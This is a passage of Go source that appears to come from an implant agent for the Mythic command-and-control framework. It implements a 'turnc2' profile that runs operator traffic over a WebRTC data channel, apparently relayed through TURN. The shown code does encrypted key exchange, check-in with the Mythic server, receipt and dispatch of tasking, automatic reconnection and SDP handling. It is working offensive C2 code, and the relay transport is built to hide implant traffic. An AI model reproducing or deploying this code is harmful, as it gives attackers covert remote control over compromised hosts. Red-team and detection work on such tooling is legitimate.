	copy(frame[4:], data)

	// Send in chunks
	for offset := 0; offset < len(frame); offset += maxChunkSize {
		end := offset + maxChunkSize
		if end > len(frame) {
			end = len(frame)
		}
		chunk := frame[offset:end]
		if err := c.DataChan.Send(chunk); err != nil {
			return err
		}
	}
	return nil
}

// CreateMessagesForEgressConnections drains the PushChannel and sends messages out
func (c *C2Turnc2) CreateMessagesForEgressConnections() {
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		c.SendMessage(raw)
	}
}

// getData reads messages from the WebRTC data channel and processes them
func (c *C2Turnc2) getData() {
	defer func() {
		c.stoppedChannel <- true
	}()

	// Establish the initial WebRTC connection
	for {
		if c.ShouldStop {
			return
		}
		if err := c.establishWebRTC(); err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to establish WebRTC: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(1 * time.Second)
			continue
		}
		break
	}

	// Send initial checkin or start key exchange
	if c.ExchangingKeys {
		utils.PrintDebug("[turnc2] starting key exchange\n")
		c.NegotiateKey()
	} else {
		utils.PrintDebug("[turnc2] sending initial checkin\n")
		c.CheckIn()
	}

	utils.PrintDebug("[turnc2] entering main receive loop\n")
	for {
		if c.ShouldStop {
			return
		}

		var rawData []byte
		select {
		case data, ok := <-c.recvChannel:
			if !ok {
				if c.ShouldStop {
					return
				}
				c.reconnect()
				continue
			}
			rawData = data
		case <-time.After(5 * time.Minute):
			// timeout - check if we should stop
			if c.ShouldStop {
				return
			}
			continue
		}

		if c.ShouldStop {
			return
		}

		// The data from the channel may be raw or base64 encoded
		// Try base64 decode first
		raw, err := base64.StdEncoding.DecodeString(string(rawData))
		if err != nil {
			// If not base64, use raw bytes
			raw = rawData
		}

		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("length of data < 36\n"))
			continue
		}

		encRaw := raw[36:] // Remove the UUID prefix

		if len(c.Key) != 0 {
			encRaw = c.decryptMessage(encRaw)
			if len(encRaw) == 0 {
				if c.ShouldStop {
					return
				}
				IncrementFailedConnection(c.ProfileName())
				c.reconnect()
				time.Sleep(1 * time.Second)
				continue
			}
		}

		if c.FinishedStaging {
			taskResp := structs.MythicMessageResponse{}
			err = json.Unmarshal(encRaw, &taskResp)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v\n", err))
			}
			responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
		} else {
			if c.ExchangingKeys {
				if c.FinishNegotiateKey(encRaw) {
					c.CheckIn()
				} else {
					c.NegotiateKey()
				}
			} else {
				// Should be the result of CheckIn
				checkinResp := structs.CheckInMessageResponse{}
				err = json.Unmarshal(encRaw, &checkinResp)
				if checkinResp.Status == "success" {
					SetMythicID(checkinResp.ID)
					c.FinishedStaging = true
					c.ExchangingKeys = false
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to checkin, got a weird message: %s\n", string(encRaw)))
				}
				utils.PrintDebug("adding missed poll messages to push messages")
				missedMessages := responses.CreateMythicPollMessage()
				c.PushChannel <- *missedMessages
				utils.PrintDebug("added missed poll messages")
			}
		}
	}
}

func (c *C2Turnc2) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Turnc2) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

// buildSyntheticOffer constructs a minimal SDP offer from the server's ICE/DTLS
// parameters. Used during reconnect when the server has created a fresh PC.
// The offer has no ICE candidates — the server's relay candidate is trickled separately.
func buildSyntheticOffer(iceUfrag, icePwd, fingerprint string) string {
	return "v=0\r\n" +
		"o=- 0 0 IN IP4 0.0.0.0\r\n" +
		"s=-\r\n" +
		"t=0 0\r\n" +
		"a=group:BUNDLE 0\r\n" +
		"a=msid-semantic: WMS\r\n" +
		"m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n" +
		"c=IN IP4 0.0.0.0\r\n" +
		"a=mid:0\r\n" +
		"a=ice-ufrag:" + iceUfrag + "\r\n" +
		"a=ice-pwd:" + icePwd + "\r\n" +
		"a=fingerprint:" + fingerprint + "\r\n" +
		"a=setup:actpass\r\n" +
		"a=sctp-port:5000\r\n"
}

// SDP parsing helpers — extract minimal answer fields from local SDP

// extractRelayCandidate finds the first relay candidate in the SDP and returns its address and port.
func extractRelayCandidate(sdp string) (string, int) {
	re := regexp.MustCompile(`a=candidate:\S+ \d+ \S+ \d+ (\S+) (\d+) typ relay`)
	for _, line := range strings.Split(sdp, "\n") {
		matches := re.FindStringSubmatch(line)
		if len(matches) >= 3 {
			port, err := strconv.Atoi(matches[2])
			if err == nil {
				return matches[1], port
			}
		}
	}
	return "", 0
}

// extractICECredentials extracts ice-ufrag and ice-pwd from the SDP.
func extractICECredentials(sdp string) (string, string) {
	var ufrag, pwd string
	for _, line := range strings.Split(sdp, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "a=ice-ufrag:") {
			ufrag = strings.TrimPrefix(line, "a=ice-ufrag:")
		} else if strings.HasPrefix(line, "a=ice-pwd:") {
			pwd = strings.TrimPrefix(line, "a=ice-pwd:")
		}
	}
	return ufrag, pwd
}

// extractFingerprint extracts the DTLS fingerprint from the SDP.
func extractFingerprint(sdp string) string {
	for _, line := range strings.Split(sdp, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "a=fingerprint:") {
			return strings.TrimPrefix(line, "a=fingerprint:")
		}
	}
	return ""
}

// Brotli compression utilities

func compressBase64(input []byte) (string, error) {
	var buf bytes.Buffer
	writer := brotli.NewWriter(&buf)
	if _, err := writer.Write(input); err != nil {
		return "", err
	}
	if err := writer.Close(); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func decompressBase64(input string) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(input)
	if err != nil {
		return nil, err
	}
	reader := brotli.NewReader(bytes.NewReader(decoded))
	return io.ReadAll(reader)
}
